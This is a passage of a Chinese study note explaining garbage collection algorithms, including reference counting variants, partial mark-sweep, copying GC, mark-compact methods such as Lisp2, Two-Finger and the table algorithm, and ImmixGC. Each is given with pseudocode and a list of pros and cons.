obj.ref_cnt-- if(obj.ref_cnt == 0) if(is_full($zct) == TRUE) scan_zct() push($zct, obj)&#125;// new_obj：分配对象的chunk。会进行两次chunk的分配，第一次试图常规分配。如果不成功则清空ZST进行第二次chunk分配。new_obj(size)&#123; obj = pickup_chunk(size, $free_list)\t\t\t\t\t// 第一次chunk分配 if(obj == NULL) scan_zct() obj = pickup_chunk(size, $free_list)\t\t\t\t\t// 清空ZST后进行第二次chunk分配 if(obj == NULL) allocation_fail() obj.ref_cnt = 1 return obj&#125;// scan_zct：清空ZST表。首先将根引用的对象加一（为了使计数器正常体现对象的引用计数）。此时判断ZST表的所有对象的引用计数，如果对象计数器为0则将其释放并移出ZST。如果大于0则代表该对象为活动对象，只将其移出ZST。scan_zct()&#123; for(r : $roots) (*r).ref_cnt++ for(obj : $zct)     remove($zct, obj)\t\t\t\t\t\t// 不管obj.ref_cnt是否为0都将其移出ZST。 \tif(obj.ref_cnt == 0) \t\tdelete(obj) for(r : $roots) (*r).ref_cnt--&#125;// delete：递归处理该对象的子对象的引用计数，并将该对象挂在空闲队列上。delete(obj)&#123; for(child : children(obj) (*child).ref_cnt-- if((*child).ref_cnt == 0) delete(*child) reclaim(obj)&#125;\n\n【优点】延迟了根引用的计数，减轻了因根引用对计数器增减造成的负担。\n【缺点】为了延迟计数器值的增减，势必造成垃圾不能马上得到回收。导致最大暂停时间延长。\nSticky引用计数法该方式解决的是计数器需要占用很多位的问题。核心在于减少计数器的位宽。但减少位宽可能会出现数值溢出的现象。针对计数器溢出的问题，主要有两种方法来处理这个问题。\n\ndo nothing：不再处理该计数器溢出的对象。某对象计数器溢出正说明该对象较为重要，不易变为垃圾而被回收。\n\n使用GC标记-清除算法进行管理：可以使用GC 标记 - 清除算法来充当引用计数法的后援。大致思路就是将计时器全部清零（目的是为了模拟GC 标记 - 清除算法中的标记位），之后还是像GC 标记 - 清除算法一样，将活动对象的计数器+1，也就是让他非0，之后遍历整个堆回收非活动对象。\n这里的的 GC 标记 - 清除算法和之前的 GC 标记 - 清除算法主要有以下 3 点不同。\n\n\n 一开始就把所有对象的计数器值设为 0\n 不标记对象，而是对计数器进行增量操作\n 为了对计数器进行增量操作，算法对活动对象进行了不止一次的搜索\n\n\n【优点】即使对象在计数器溢出后成了垃圾，程序还是能回收它。\n【优点】可以回收循环的垃圾。\n【缺点】吞吐量会降低：一是因为需要重置所有对象的计数器。二是由于这里的的 GC 标记 - 清除算法是进行计数器的增量，此时对象的索引也需要消耗一定的时间。\n\n\n1位引用计数法（1bit Reference Counting）1 位引用计数法解决的仍然是计数器需要占用很多位的问题。基于“一般的对象都很难被共有”的理论，可以得出一般的对象引用计数都为1。考虑到这一点，我们用 1 位来表示某个对象的被引用数是 1 个还是多个（即用 0 表示被引用数为 1， 1 表示被引用数&gt;= 2，我们分别称以上 2 种状态为 UNIQUE 和 MULTIPLE），这样也能达到目的。\n1 位引用计数法比较特殊的一点在于它使用指针来存放引用计数（正常引用计数法使用对象来存放，这里凭借四字节对齐最后两位不能利用的性质，可以将这个引用计数，也可以叫做flag放入指针来达到目的），这样当更新指针时只要将指针复制即可。\n\n\n这里更新了之前由 A 引用 D 的指针，让其引用 C。这也可以看成是把由 B 到 C 的指针复制到 A 了。通过这项操作，两个指向 C 的指针都变成了 MULTIPLE 指针。\n// 上图的 A 的指针就是dest_ptr，B 的指针就是被复制的src_ptr。经过复制，两个指针都会set_multiple_tag，也就是都变成了 MULTIPLE 指针。copy_ptr(dest_ptr, src_ptr)&#123; delete_ptr(dest_ptr) *dest_ptr = *src_ptr set_multiple_tag(dest_ptr) if(tag(src_ptr) == UNIQUE) set_multiple_tag(src_ptr)&#125;// 这个函数超级简单。只有当指针 ptr 的标签是 UNIQUE 时，它才会回收根据这个指针所引用的对象。因为当标签是 MULTIPLE 时，还可能存在其他引用这个对象的指针，所以它无法回收对象。delete_ptr(ptr)&#123; if(tag(ptr) == UNIQUE) reclaim(*ptr)&#125;\n\n【优点】不容易出现高速缓存缺失：缓存作为一块存储空间，比内存的读取速度要快得多。如果要读取的数据就在缓存里的话，计算机就能进行高速处理；但如果需要的数据不在缓存里（即高速缓存缺失）的话，就需要读取内存，比较浪费时间。当某个对象 A 要引用在内存中离它很远的对象 B 时，以往的引用计数法会在增减计数器值的时候读取 B，从而导致高速缓存缺失。但由于1 位引用计数法不需要在更新计数器（或者说是标签）的时候读取要引用的对象，只是指针的复制过程，所以可以减少出现这种问题。\n【优点】节省内存：毕竟只占用1位。\n【缺点】无法处理计数器溢出的对象：和 Sticky 引用计数法一样，这个可能需要其他方式（比如GC标记-清除算法）辅助操作。\n部分标记-清除算法（Partial Mark &amp; Sweep）首先提一句，这个算法看起来比较麻烦，但是原理还是很容易懂的，无非就是利用了一个队列存放可疑对象之后对可疑对象进行操作的过程。\n上面用来兜底的GC 标记 - 清除算法由于以全部堆为对象导致效率很低。产生了很多无用的搜索。因此我们可以只对“可能有循环引用的对象群”使用 GC 标记 - 清除算法，对其他对象进行内存管理时使用引用计数法。像这样只对一部分对象群使用 GC 标记 -清除算法的方法，叫作“部分标记 - 清除算法”。\n说白了，这个算法的目的就是为了找到循环引用的对象群并进行处理。\n在部分标记 - 清除算法中，对象会被涂成 4 种不同的颜色来进行管理。每个颜色的含义如下：\n\n\n 黑（BLACK）：绝对不是垃圾的对象（对象产生时的初始颜色）\n 白（WHITE）：绝对是垃圾的对象\n 灰（GRAY）：搜索完毕的对象\n 阴影（HATCH）：可能是循环垃圾的对象。\n\n\n具体实施方式是往头中分配 2 位空间，然后用00～11 的值对应这 4 个颜色，以示区分。这里用 obj.color 来表示对象 obj 的颜色。obj.color 取 BLACK、WHITE、GRAY、HATCH 中的任意一个值。\n下面是具体步骤，以一个具体的例子进行描述\n1、初始状态有循环引用的对象群是 ABC 和 DE，其中 A 和 D 由根引用。此外，这里由 C 和 E 引用 F。所有对象的颜色都还是初始状态下的黑色。\n\n2、dec_ref_cnt// dec_ref_cnt：在进行减引用的操作时，如果该对象的引用计数不为0，将其颜色涂成阴影，并放入一个专门存放阴影对象的队列中。dec_ref_cnt(obj)&#123; obj.ref_cnt-- if(obj.ref_cnt == 0) delete(obj) else if(obj.color != HATCH) obj.color = HATCH enqueue(obj, $hatch_queue)&#125;\n\n在这步操作后堆状态如下。由根到 A 的引用被删除了，指向 A 的指针被追加到了队列（$hatch_queue）之中。此外，A 被涂上了阴影。这个队列的存在是为了连接那些可能是循环引用的一部分的对象。被连接到队列的对象会被作为 GC 标记 - 清除算法的对象，使得循环引用的垃圾被回收。\n\n3、new_obj &amp; scan_hatch_queue// new_obj：当可以分配时，对象就会被初始化成黑色。当分配无法顺利进行的时候，程序会通过 scan_hatch_queue() 函数搜索阴影队列去尝试回收垃圾。scan_hatch_queue() 函数执行完毕后，程序会递归地调用 new_obj() 函数再次尝试分配。new_obj(size)&#123; obj = pickup_chunk(size) if(obj != NULL) obj.color = BLACK obj.ref_cnt = 1 return obj else if(is_empty($hatch_queue) == FALSE) scan_hatch_queue() return new_obj(size) else allocation_fail()&#125;// scan_hatch_queue：如果取出的对象 obj 被涂上了阴影，程序就会将 obj 作为参数，依次调用 paint_gray、scan_gray和 collect_white 函数从而通过这些函数找出循环引用的垃圾，将其回收。当 obj 没有被涂上阴影时，就意味着 obj 没有可能形成循环引用。此时程序将再次调用 scan_hatch_queue函数进行下一个阴影对象的操作。scan_hatch_queue()&#123; obj = dequeue($hatch_queue) if(obj.color == HATCH) paint_gray(obj) scan_gray(obj) collect_white(obj) else if(is_empty($hatch_queue) == FALSE) scan_hatch_queue()&#125;\n\n4、paint_gray// paint_gray：将选中的阴影对象及子对象（子对象颜色需为黑或阴影）涂灰，并将所有对象的子对象的引用计数减一，paint_gray(obj)&#123; if(obj.color == (BLACK | HATCH)) obj.color = GRAY for(child : children(obj)) (*child).ref_cnt-- paint_gray(*child)&#125;\n\n执行完成后大概如下图\n\n执行过程如下图\n\n首先，在 (a) 中 A 被涂成了灰色。虽然程序对计数器执行了减量操作，但并不是对 A，而是对 B 的计数器进行了减量操作。下面在 (b) 中 B 也被涂成了灰色，不过这时程序并没有对 B 进行减量操作，而是对 C 进行了减量操作。在 (c) 中 C 被涂成灰色时，程序对 A 和 F 的计数器进行了减量操作。这样一来，A、B、C 的循环垃圾的计数器值都变成了 0。(d) 是 A、B、C、F 各个对象搜索结束后的样子。\n部分标记 - 清除算法的特征就是要涂色的对象和要进行计数器减量的对象不是同一对象，据此就可以很顺利地回收循环垃圾。这样做的原因是为了明确这个阴影对象是否在环内，证明如下：\n假如原始图如下\n\n当要涂色的对象和要进行计数器减一的对象为同一对象时，过程如下\n\n这样我们并不能通过A的引用计数直接确定该对象是否在环中。因为无论A是否成环，它的引用计数一直为0，所以无法对是否成环进行区分。而当我们计数器减一的对象在涂色对象之后时，我们可以很容易通过A的计数判断它是否是一个独立的环。\n\n当搜索完 C 时对象 A 的计数器值为 1，所以 A 不能被回收。所以很明显这个并不是一个独立的环。在这之后，paint_black() 函数会把对象 A 到 C 全部涂黑，也会对 B 和 C 的计数器进行增量操作，这样对象就完全回到了原始的状态。\n5、scan_gray执行完 paint_gray() 函数以后，下一个要执行的就是 scan_gray() 函数。它会搜索灰色对象，把计数器值为 0 的对象涂成白色。\n// scan_gray：这个函数作用是为了操作灰色对象，如果灰色对象的引用计数为0则将其涂白，否则将其涂黑。scan_gray(obj)&#123; if(obj.color == GRAY) if(obj.ref_cnt &gt; 0) paint_black(obj) else obj.color = WHITE for(child : children(obj)) scan_gray(*child)&#125;// paint_black：在涂黑的过程中也会将引用计数恢复，因为涂灰操作将引用计数减一了。paint_black(obj)&#123; obj.color = BLACK for(child : children(obj)) (*child).ref_cnt++ if((*child).color != BLACK) paint_black(*child)&#125;\n\n此时现场如下，不难看出，形成了循环垃圾的对象 A、B、C 被涂成了白色，而有循环引用的非垃圾对象 D、E、F 被涂成了黑色。\n\n6、collect_white// collect_white，这个函数很简单，就是为了回收白色对象。但是这里我并不明白为什么还要把obj涂黑。collect_white(obj)&#123; if(obj.color == WHITE) obj.color = BLACK for(child : children(obj)) collect_white(*child) reclaim(obj)&#125;\n\n回收独立环后的对象如下。\n\n到这步已经完成了整个回收独立环的操作，大体步骤就是先将可疑对象挑出，然后遍历可疑对象挨个判断，判断方式为将子对象的引用计数减一，如果成环则环内的引用计数都会互相减为0，最终自身也会被减为0，也就是对象自己发起操作后又反馈改变了自身，这样就判断了环是否存在，之后就是回收环内对象的过程。而这个阴影队列的作用就在于假如这个阴影对象真的在环中我们无法找到他，就可以通过队列存放的指针指向这块空间。\n【优点】吞吐量：聚焦于成环对象的搜索与清除，减少了其他无需索引对象的索引成本。\n【缺点】吞吐量：还是吞吐量的问题，对队列中的候选垃圾处理较复杂。由于该算法对队列中每个对象进行了三次操作（mark_gray，scan_gray和collect_white），增加了内存管理所花费的时间。\n【缺点】最大暂停时间增加：势必增加最大暂停时间的长度，毕竟会对队列对象进行操作。\nGC复制算法（Copying GC）定义GC复制算法需要两块同样大小的空间，分别称为From空间和To空间。通过将From 空间的活动对象复制到To空间，再对From 空间和 To 空间互换来实现GC，此时新的From空间是一块干净的空间。（Marvin L. Minsky 1963发布）\n实现// copying：将活动的对象从From空间copy进To空间，再对From 空间和 To 空间互换copying()&#123; $free = $to_start for(r : $roots) *r = copy(*r) swap($from_start, $to_start)&#125;// copy：复制给定的活动对象并递归copy该对象的子对象copy(obj)&#123; if(obj.tag != COPIED) copy_data($free, obj, obj.size) obj.tag = COPIED obj.forwarding = $free $free += obj.size for(child : children(obj.forwarding)) *child = copy(*child) return obj.forwarding&#125;//  GC 完成后只有 1 个chunk的内存空间。在每次分配时，只要把所申请大小的内存空间从这个chunk中分割出来给 mutator 就行了。也就是说，这里的分配跟 GC 标记 - 清除算法中的分配不同，不需要遍历空闲链表。new_obj(size)&#123; if($free + size &gt; $from_start + HEAP_SIZE/2) copying() if($free + size &gt; $from_start + HEAP_SIZE/2) allocation_fail() obj = $free obj.size = size $free += size return obj&#125;\n\n执行过程如下图，通过深搜的方式将根执行的活动对象依次由From空间拷贝到To空间。这里对号表示已经复制完成，对号后面的 BꞋ 表示的是forwarding指针，指向To空间。\n\n\n\n\n评估优点\n优秀的吞吐量：由于只需要遍历活动对象并清除整个堆的时间，所以它可以在较短时间内完成GC。\n可实现高速分配：GC 复制算法不使用空闲链表。这是因为空闲chunk是一个连续的内存空间。通过移动 $free 指针来分配内存。\n不会发生碎片化：由于GC复制算法具有“压缩”（把对象重新集中，放在堆的一端的行为）的性质，分配空间直接移动$free指针，就算$free前面的内存被释放了，GC之后又可以将活动对象“压缩”。\n与缓存兼容：在 GC 复制算法中有引用关系的对象会被安排在堆里离彼此较近的位置。这可以使 mutator 执行速度加快。\n\n缺点\n堆使用效率低：GC 复制算法把堆二等分，只能利用其中的一半来安排对象，浪费空间。\n不兼容保守式GC算法：GC 复制算法必须移动对象重写指针，而保守式GC的性质决定了它不允许移动对象。\n递归调用函数：复制某个对象时要递归复制它的子对象。因此带来额外的处理负担。相比起递归算法，迭代算法能更高速地执行 。\n\n优化措施Cheney的GC复制算法解决的是递归调用函数的问题。核心在于使用迭代方式遍历复制，但是使用了广搜的方式，但是没有充分利用缓存的便利——有引用关系的对象不相邻。\n// 将 scan 和 $free 的两个指针初始化。scan 是用于搜索复制完成的对象的指针。$free 是指向chunk开头的指针，copying()&#123; scan = $free = $to_start for(r : $roots) *r = copy(*r) while(scan != $free) for(child : children(scan)) *child = copy(*child) scan += scan.size swap($from_start, $to_start)&#125;// 判断forwarding指针指向哪块空间来判断是否复制完成，因为复制完成的话该指针指向的是To空间copy(obj)&#123; if(is_pointer_to_heap(obj.forwarding, $to_start) == FALSE) copy_data($free, obj, obj.size) obj.forwarding = $free $free += obj.size return obj.forwarding&#125;\n\n使用了$scan 和 $free。首先复制所有从根直接引用的对象，在这里就是复制 B 和 G。$scan指向当前正在搜索的对象，$free指向空闲chunk的开头。复制的过程中$scan与 $free一般中间会有一部分对象，我们知道这些对象都是活动对象，并按照先入先出（FIFO）的方式进行操作（这样把堆兼用作队列正是 Cheney 算法的一大优点，不用特意为队列留出多余的内存空间就能进行搜索。）。最后复制完成后$scan与 $free会重合。\n【优点】递归方式遍历子对象减轻了调用函数的额外负担和栈的消耗。特别是拿堆用作队列，省去了用于搜索的内存空间的步骤。\n【缺点】具有引用关系的对象是相邻的才能充分利用缓存的便利。在该算法中使用了广搜致使引用对象并不相邻是比较可惜的一点。\n\n\n\n\n近似深度优先搜索方法解决的仍然是递归调用函数的问题，对Cheney 的 GC 复制算法进行了缓存上的优化，Cheney 的 GC 复制算法由于在搜索对象上使用了广度优先搜索，因此存在“没法沾缓存的光”的缺点。近似深度优先搜索方法可以解决这个问题。\n\n\n\n当使用近似深度优先搜索算法时，如果一个对象被安排在页面开头时，直接搜索该对象的子对象。概念也比较好理解，广搜的过程中对临近对象使用深搜。\n\n\n\n\n\n\n\n多空间复制算法GC 复制算法最大的缺点是只能利用半个堆。如果把堆由分成 2 份改为分成 10 份，其中的2 块空间执行 GC 复制算法。其他8份空间执行其他GC算法，就可以提高堆使用效率。\n// multi_space_copying：这里将堆 N 等分，每次To空间和From空间都会后移，其余的对象使用GC标记-清除算法。multi_space_copying()&#123; $free = $heap[$to_space_index] for(r : $roots) *r = mark_or_copy(*r) for(index : 0..(N-1)) if(is_copying_index(index) == FALSE) sweep_block(index) $to_space_index = $from_space_index $from_space_index = ($from_space_index + 1) % N&#125;// mark_or_copy：通过判断obj是否在From空间中来决定使用GC复制算法进行处理还是使用GC标记-清除算法进行处理。mark_or_copy(obj)&#123; if(is_pointer_to_from_space(obj) == TRUE) return copy(obj) else if(obj.mark == FALSE) obj.mark = TRUE for(child : children(obj)) *child = mark_or_copy(*child) return obj&#125;// copy：for循环中调用的是 mark_or_copy 函数而非 copy 函数。copy(obj)&#123; if(obj.tag != COPIED) copy_data($free, obj, obj.size) obj.tag = COPIED obj.forwarding = $free $free += obj.size for(child : children(obj.forwarding)) *child = mark_or_copy(*child) return obj.forwarding&#125;\n\n\n\n\n【优点】提高了堆使用效率。\n【缺点】由于引入了GC-标记清除算法，虽然提高了堆使用效率，但是分配耗费时间、chunk碎片化等问题也会出现。\nGC标记-压缩算法（Mark Compact GC）定义GC 标记 - 压缩算法由标记阶段和压缩阶段构成。首先，这里的标记阶段和 GC 标记 - 清除算法时提到的标记阶段完全一致。接下来搜索数次堆来进行压缩。压缩一是可以利用缓存优势，二是可以减少内存碎片，也无需牺牲半个堆。\n实现首先是经典的Lisp2算法，Lisp2 算法在对象头提供了 $forwarding 指针的空间。 $forwarding 指针指向要移动位置的地址。这也是这个算法的一个劣势（每个对象都要额外占用一个forwarding 指针）。\n为什么每个对象都要额外占用一个forwarding 指针？（由于GC复制算法中使用了两块空间，将数据完成后再将原From空间的数据段选出一部分当作$frorwarding指针，毕竟当复制过程完毕后原From空间的对象也失去了意义。设置$frorwarding的目的是当有指针指向原From空间的原活动对象时，可以使用$forwarding指针将该指针索引到To空间的活动对象中。而Lisp2算法没有类似于To空间这样的复制空间，而且流程是先设置$forwarding指针再去移动对象，所以之前的对象内容需要进行保留，如果仍使用其数据段会覆盖对象原本的内容（GC复制算法随便修改之前对象的内容，之后都会被全部清空），所以需要额外占用一个forwarding 指针存放要移动到的位置）。\n整体流程Lisp2算法的压缩阶段并不会改变对象的排列顺序，只是缩小了它们之间的空隙，把它们聚集到了堆的一端。他和GC复制算法有个很大的区别就是GC复制算法是对每个对象都进行复制对象，对象指针修改，forwarding指针修改，处理完一个对象再处理下一个对象。而Lisp2算法则是分为三个阶段，每个阶段都处理所有对象。\n\n\n\n压缩阶段// compaction_phase：Lisp2的压缩阶段由三个阶段组成：（1）设定 forwarding 指针； （2）更新指针； （3）移动对象void compaction_phase()&#123; set_forwarding_ptr() adjust_ptr() move_obj()&#125;// set_forwarding_ptr：第一阶段遍历一次整个堆空间，并为所有活动对象设定 forwarding指针。set_forwarding_ptr()&#123; scan = new_address = $heap_start while(scan &lt; $heap_end) if(scan.mark == TRUE) scan.forwarding = new_address new_address += scan.size scan += scan.size&#125;// adjust_ptr：第二阶段又遍历一次堆空间。依据第一阶段得出的forwarding指针，将指向原活动对象的指针变为指向原活动对象forwarding指针位置处，也就是新活动对象位置处。adjust_ptr()&#123; for(r : $roots) *r = (*r).forwarding scan = $heap_start while(scan &lt; $heap_end) if(scan.mark == TRUE) for(child : children(scan)) *child = (*child).forwarding scan += scan.size&#125;// move_obj：第三阶段再遍历一次堆空间，将活动对象移动到 forwarding 指针的引用目标处。move_obj()&#123; scan = $free = $heap_start while(scan &lt; $heap_end) if(scan.mark == TRUE) new_address = scan.forwarding copy_data(new_address, scan, scan.size) new_address.forwarding = NULL new_address.mark = FALSE $free += new_address.size scan += scan.size&#125;\n\n评估优点\n堆利用率高：一是因为压缩，使得其基本没有碎片化问题。二是相对于GC复制算法，不需要舍弃半个堆，而可以在整个堆中安排对象。堆使用效率几乎是 GC 复制算法的 2 倍。\n\n缺点\n吞吐量较低：以Lisp2算法为例，整个过程需要对整个堆进行三次搜索。执行该算法所花费的时间是和堆大小成正比的。\n\n优化措施Two-Finger算法Two-Finger算法一是需要所有对象大小一致 ，二是无需forwarding 指针空间 。由以下 2 个步骤构成。（1）移动对象 。 （2）更新指针 。实际上相当于两根手指分别从堆首和堆尾向中间逼近，将后面的活动对象放在前面去，由于对象大小一致，所以这样移动没有任何后顾之忧）\n\n实现如下\n// move_obj：移动对象，使用$free 和 live 两个指针从两端向正中间搜索堆。$free 是用于寻找非活动对象（目标空间）的指针，live 是用于寻找活动对象（原空间）的指针。当两个指针相遇时证明已完成压缩。move_obj()&#123; $free = $heap_start live = $heap_end - OBJ_SIZE while(TRUE) while($free.mark == TRUE) $free += OBJ_SIZE while(live.mark == FALSE) live -= OBJ_SIZE if($free &lt; live) copy_data($free, live, OBJ_SIZE) live.forwarding = $free live.mark = FALSE else break&#125;// adjust_ptr：调整指向移动前对象的指针，因为移动前的对象位置已经无用，而真正的对象在移动后的位置，所以需要更新指针。// 这里有个很特别的点，$free指针，由于它的特性，前面都是活动对象，后面都是非活动对象。所以在调整指针的时候可以对指向的位置进行判断，如果在$free后面，就将其赋值为其forwarding 指针位置。（因为后面的对象不用了，所以可以将其对象空间存放forwarding 指针的值而无需单独开辟forwarding 指针的空间。）adjust_ptr()&#123; for(r : $roots) if(*r &gt;= $free) *r = (*r).forwarding scan = $heap_start while(scan &lt; $free) scan.mark = FALSE for(child : children(scan)) if(*child &gt;= $free) *child = (*child).forwarding scan += OBJ_SIZE&#125;\n\n\n\n\n【优点】无需要额外的空间存放 forwarding 指针，相比于 Lisp2 算法提高了堆使用效率。\n【优点】由于优化了更新 forwarding 指针的步骤，所以可以少搜索一次整个堆。\n【缺点】不能利用引用对象相邻的缓存优势，这样操作完全不能保证引用对象相邻。\n【缺点】要求所有对象的大小必须一致。不过可以结合BiBOP 法克服这个问题——将同一大小的对象安排在同一个块里，之后对每个块应用 Two-Finger 算法。如下，每个块的活动对象都在它的起始位置\n\n表格算法这个又是个看起来很恐怖其实也比较好理解的算法。\n表格算法：（1）对象群一起移动。（2）使用了间隙表格来代替forwarding 指针。\n它通过以下 2 个步骤来执行压缩。（1）移动对象（群）以及构筑间隙表格（break table）。（2）更新指针。\n基本思路就是将之前的一个对象一个对象向前移动的方式改为移动对象群，并通过间隙表格存储代替forwarding 指针。间隙表格第一项存储的是被移动对象的起始位置，第二项存储的是要向前移动的长度。（比如下面图片的（100，100）就代表B的起始位置为100，向前移动100到 BꞋ）。之后的指针移动也是同理，只不过由原来的通过forwarding 指针索引改编为通过间隙表格索引了。\n// move_obj：该伪代码只包含了移动对象（群）的操作，而构筑间隙表格（break table）使用了slide_objs_and_make_bt函数实现，伪代码实现比较麻烦，所以下面文字图片方式进行解释。move_obj()&#123; scan = $free = $heap_start size = 0 while(scan &lt; $heap_end) while(scan.mark == FALSE) size += scan.size scan += scan.size live = scan while(scan.mark == TRUE) scan += scan.size slide_objs_and_make_bt(scan, $free, live, size) $free += (scan - live)&#125;// adjust_ptr：更新指针adjust_ptr()&#123; for(r : $roots) *r = new_address(*r) scan = $heap_start while(scan &lt; $free) scan.mark = FALSE for(child : children(scan)) *child = new_address(*child) scan += scan.size&#125;// new_address：替代了之前forwarding指针的作用，返回移动后活动对象的地址。new_address(obj)&#123; best_entry = new_bt_entry(0, 0) for(entry : break_table) if(entry.address &lt;= obj &amp;&amp; $best_entry.address &lt; entry.address) best_entry = entry return obj - best_entry.size&#125;\n\n\n\n【优点】不需要forwarding 指针，因为它利用了间隙表格来存储相关的信息。但是间隙表格需要准备两个单位的空间来存放对象群信息。\n【优点】因为相较于于Two-Finger算法的压缩过程保留对象顺序，所以可以利用引用对象缓存优势提高对象的访问速度。\n【缺点】要维持间隙表格需要付出很高的代价，因为每次移动活动对象群都要进行表格的移动和更新。\n【缺点】在更新指针时也不能忽略搜索表格所带来的消耗。在更新指针前，如果先将表格排序，则表格的搜索就能高速化。不过排序表格也需要相应的消耗，所以并不能从根本上解决问题。\nImmixGC算法该算法比较复杂，而且也相对比较新，是Stephen M. Blackburn 和 Kathryn S. McKinley 于 2008 年研究出来的，据说论文的作者把这个算法实现到了 JikesRVM（Research Virtual Machine）A 的内存管理软件包 MMTk（Memory Management Toolkit）中。\n概要ImmixGC 把堆分为一定大小的“块”（block），再把每个块分成一定大小的“线”（line）。这个算法不是以对象为单位，而是以线为单位回收垃圾的。分配时程序首先寻找空的线，然后安排对象。没找到空的线时就执行 GC。\nGC 分为以下 3 个步骤执行：（1）选定备用的 From 块。（2）搜索阶段.（3）清除阶段。\n不过该算法不是每次都执行步骤 （1） 的。在 ImmixGC 中，只有在堆消耗严重的情况下，为了分配足够大小的chunk时才会执行压缩。此时会通过步骤 1 来选择作为压缩对象的备用块（备用的 From 块）。\n接下来，在步骤 （2） 中从根搜索对象，根据对象存在于何种块里来分别进行标记操作或复制操作。具体来说，就是对存在于步骤 1 中选择的备用 From 块里的对象执行复制操作，对除此之外的对象进行标记操作。\n步骤 （3） 则是寻找没有被标记的线，按线回收非活动对象。\n以上就是 ImmixGC 的概要。\n堆的构成ImmixGC 中把堆分成块，把每个块又分成了更小的线。据论文中记载，块最合适的大小是 32K 字节，线最合适的大小是 128 字节。我们在此就直接引用论文中的数值。这样一来，每个块就有 32×1024÷128 ＝ 256 个线。\n各个块由以下 4 个域构成。\n• line\n• mark_table\n• status\n• hole_cnt\n打个比方，用 $block[i].status 就可以访问位于第 i 号块的 status 域。\n line： line 就跟它的名字一样，是每个块的线，线里会被安排对象。$block[i].line[j] 表示的就是第 i 号块的第 j 号线。\nmark_table：mark_table 则是与每个线相对应的用于标记的位串。打个比方，与第 i 号块的第 j 号线相对应的用于标记的位串就是 $block[i].mark_table[j]。我们分给 mark_table[j] 一个字节，在标记或分配下面的某个常量时，将其记录在 mark_table[j] 中。\n\n FREE（没有对象）\n MARKED（标记完成）\n ALLOCATED（有对象）\n CONSERVATIVE（保守标记）\n\nstatus：status 是用于表示每个块中的使用情况的域。我们也分给 status 一个字节，在执行GC 或分配时，记录下面的某个常量。\n\n FREE（所有线为空）\n\n RECYCLABLE（一部分线为空）\n\nUNAVAILABLE（没有空的线）\n 初始状态下所有块都是 FREE\n\n\nhole_cnt：hole_cnt 负责记录各个块的“孔”（hole）数。这里所说的孔拥有连续的大于等于 1 个的空的线。我们用这个 hole_cnt 的值作为表示碎片化严重程度的指标。如果某个chunk的hole_cnt 的值很大，它就很可能被标记为备用From空间，从而使用GC复制算法来进行处理。而hole_cnt 较小的chunk则由GC标记-清除算法进行处理。\n下面的图表示了使用ImmixGC算法的堆情况：\n\n分配过程分配的整体过程如下图所示，核心在于判断mark_table的状态，当mark_table标记为Free才在这个line中分配内存。当然这个过程也会可能会更新chunk的hole_cnt以及status。\n分配过程采取了保守标记，考虑到小型对象可能会占据 line[i+1] 的 情 况，当 mark_table[i+1] 是FREE 时，把 它 定 为 CONSERVATIVE。这 里 的 CONSERVATIVE 的 意 思 是“如 果 小 型 对 象 占 据了 line[i+1]，则 mark_table[i+1] 可能会包含所分配对象的后半部分”（例如图 (a) 的$block[0].line[4] 这样的情况）。不过之后在 line[i+1] 进行分配的时候，要事先将 mark_table[i+1] 的值从 CONSERVATIVE 改写成 ALLOCATED。\n这样保守的标记在标记阶段是很有用的。在标记阶段中，每次搜索对象都必须检查这个对象是否占据了其他的线，为此程序每次都要调查对象的大小，因为要调查所有活动对象，所以这项处理就带来了额外的负担。为了省去这项处理，我们才采取了较为保守的做法，即事先对小型对象打上 CONSERVATIVE这个标记。因为程序中要频繁用到小型对象，所以这个办法是非常有效的。\n\nGC过程步骤 1—选定备用From块\n资料上面给的过程比较详细，需要很长时间才能理解操作的本质以及这样做的意义。经过本人的理解，将其精炼为我自己的看法。\n首先统计以hole_cnt维度的FREE线以及非FREE线的总数，得到类似于下面的表。\n\n这里的require 是备用 From 块里非 FREE 线的总数，available 是除了备用 From 块以外的块所持有的 FREE 线的总数。简单来说就是评价孔数维度chunk是否释放的权重。（这里并非单个chunk最大孔数就为6孔了，而是为了举例理解该算法的思想。）\n因为status 为FREE的块里面全部为FREE线，所以假设这张表有两个FREE块，此时这两个FREE块的FREE线则为256 * 2 == 512个。\n此时available == 512 + 10 + 29 + 49 + 41 + 36 + 40 == 717 。我们判断require 与available 权重的方式就是直观的比大小。接下来计算出require &gt; available 孔的数量。\n\n\n\n经过上面的图发现当hole_cnt为4的时候，require &gt; available 。所以当hole_cnt &gt; 4的所有chunk将被设置为备用FREE空间，交由GC复制算法来处理。\n步骤2—搜索阶段\n搜索阶段要从根开始搜索对象，根据对象分别进行标记处理或复制处理。这里的复制处理指的是将备用 From 块里的对象复制到别的块（To 块），并进行压缩。\n在搜索阶段中，如果搜索到的对象在备用 From 块里，那么就会进行复制操作，如果在别的块里，就会执行标记操作。\n步骤3—清除阶段\n清除阶段判断mark_table[i] 的值，如果是FREE 或 ALLOCATED，则 line[i] 里就有两种情况 —没有对象或只有垃圾，因此这个线就能被回收再利用了。\n 当mark_table[i] 的值为 CONSERVATIVE 时，可能line[i-1] 里的对象有可能也占据了 line[i] 的空间 。如果 line[i-1] 的对象都是非活动对象，就可以将 line[i] 进行回收再利用。但是即使line[i-1] 只有一个活动对象，这个对象也有可能占据 line[i] 的空间，所以这时就不能将line[i] 进行回收再利用了。\n【优点】利用线这个结构进行管理，线比块的范围小但比对象的范围大。（兼顾了效率与处理难度）\n【优点】由于备用From空间的存在，碎片化严重的块可以通过GC复制算法将活动对象进行压缩。\n【缺点】对象不是按顺序保存的，不能很好的利用缓存。\n【缺点】由于我们曾经做过保守的标记，有些没有活动对象的线有可能无法被回收。致使堆使用效率降低。\n总体来说，该算法仍然是一种比较优秀的算法。\n保守式GC（Conservative GC）定义GC有两个种类，分别为“保守式 GC”和“准确式 GC”。保守式 GC指的是“不能识别指针和非指针的 GC”（因为存在不明确的根（寄存器、调用栈、全局变量空间），里面存放的可能是指针也可能是数据）。\n存在貌似指针的非指针：当基于不明确的根运行 GC 时，偶尔会出现非指针和堆里的对象的地址一样的情况，这时 GC 就无法识别出这个值是非指针。如下图，这种情况很危险。在GC的时候即使这个对象真的用不到了也不会被回收，因为被错误识别成指针的数据指向了这个对象。\n\n不明确的数据结构：类似下面的联合体，GC不能识别出这块空间是指针还是数据。\nunion&#123; long n; void *ptr;&#125; 